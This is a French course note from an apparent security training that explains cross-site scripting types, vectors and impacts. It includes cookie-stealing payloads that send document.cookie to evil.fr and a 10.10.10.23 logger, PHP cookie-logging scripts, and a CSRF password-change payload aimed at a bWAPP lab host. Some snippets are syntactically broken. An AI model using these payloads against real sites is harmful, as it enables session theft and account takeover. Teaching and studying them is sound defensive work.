# Sites
https://github.com/payloadbox/xss-payload-list
http://www.xss-payloads.com/index.html

# XSS
Type d’injection permettant de faire exécuter du code sur le navigateur de la victime, par le biais d’une page web pour généralement :
-  Redirection de page web
-  Vol de cookies
-  Défacement du site web
-  Phishing
-  Etc.
Il existe plusieurs types d’injection XSS.
##### Vecteurs d’attaque
-  JavaScript activé par défaut sur les navigateurs
-  Toutes les entrées d’une application (URL, Headers, formulaires, ...)
-  Les payloads XSS sont tweakables
-  Des bots automatisent la recherche et l’infection
##### Faiblesse applicative
-  Pas de nettoyage des entrées utilisateurs
-  Pas de sensibilisation des utilisateurs (phishing)
-  Headers de sécurité absents
###### Impacts techniques
-  Vol de session
-  Defacing
-  Keylogger
-  Ver XSS
###### Impacts Business
-  Opérationnel
-  Financier
-  Image
-  Légal
##### XSS Reflected
-  Le code malveillant est injecté dans une requête HTTP (URI, paramètres, headers, etc ...) ;
-  L’injection n’est pas stockée donc non persistante ;
-  Demande une interaction de la victime.
##### Minifiers d’URL
Un exemple : bitly, tinyurl
![[FORMATION EXPERT SECURITE DIGITALE (ESD)/RESSOURCES/Images/Pasted image 20221130111327.png]]
##### XSS Stored
Le code malveillant injecté est enregistré en base de données (donc persistant).
Il est restitué à chaque fois que la victime appelle la ressource.
1. Le payload est injecté dans le formulaire (devenant stocké en base de données).
2. Lorsqu’un utilisateur consultera la page web contenant le payload, celui-ci sera exécuté par le navigateur de la victime.
##### Vol de cookie
Pour voler un cookie via XSS, l’attaquant a besoin de deux éléments :
-  Un payload javascript qui sera activé par la victime (envoyant le cookie sur le serveur web de l’attaquant)
```js
<script>
http://vuln.fr/page=script.location.href="http://evil.fr/cookie.php?cookie="+document.cookie;
</script>

// Afficher le cookie en alert JS
<script> alert ('document.cookie') </script>

// steal cookie and saves it to cookielist.txt
<?php
$logfile = fopen('cookielist.txt', 'a+');
fwrite($logfile, $_get['cookie']."\r\n")
fclose($logfile)
?>

```
-  Un serveur web contenant un logger qui réceptionnera le cookie envoyé
```php
<?php
	header ('Location:https://google.com');
		if (isset($_GET["c"]))
			{
				$cookies = base64_decode(urldecode($_GET["c"]));
				$file = fopen('log.txt', 'a');
				fwrite($file, $cookies . "\n\n");
			}
?>
```
Lorsque la victime activera le payload de l’attaquant, celui-ci enverra l’objet document.cookie (le cookie du site web enregistré dans le navigateur) sur le serveur web de l’attaquant, qui l’enregistrera dans un fichier .txt (grâce au logger cookie.php).

Aller plus loin
-  https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)
-  https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet

### Exercice
**PAYLOAD CSRF via XSS (Requetes URL GET)  
 ```js
//**PAYLOAD CSRF via XSS (Requetes URL GET)**
<img src="[http://bwapp.esdown.eu/csrf_1.php?password_new=toor&password_conf=toor&action=change"&gt](http://bwapp.esdown.eu/csrf_1.php?password_new=toor&password_conf=toor&action=change"&gt);    

//**PAYLOAD STEALKER COOKIE silent**
<script>var i=new Image;i.src="[http://10.10.10.23/loguer.php?cookie="+document.cookie;</script&gt](http://10.10.10.23/loguer.php?cookie="+document.cookie;</script&gt);  

<img src=x onerror="this.src='[http://10.10.10.23:8888/?'+document.cookie](http://10.10.10.23:8888/?'+document.cookie); this.removeAttribute('onerror');">
```
